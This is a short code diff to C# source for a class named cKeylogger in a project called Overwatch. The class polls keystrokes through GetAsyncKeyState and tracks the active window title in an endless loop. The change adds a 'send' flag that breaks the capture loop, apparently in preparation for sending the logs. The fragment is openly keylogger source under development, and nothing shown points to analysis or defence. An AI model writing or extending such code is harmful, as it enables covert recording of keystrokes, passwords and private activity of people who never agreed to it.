@@ -8,6 +8,7 @@ namespace Overwatch
 {
     class cKeylogger
     {
+        public static bool send = false;
         static appLog Log = new appLog();
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
@@ -36,6 +37,9 @@ namespace Overwatch
                     string tempWindowText, lastWindowText = "";
                     while (true)
                     {
+                        if (send)
+                            break;
+                        
                         for (Int32 i = 0; i < 1000; i++)
                         {
                             tempWindowText = getCurrentWindowText();
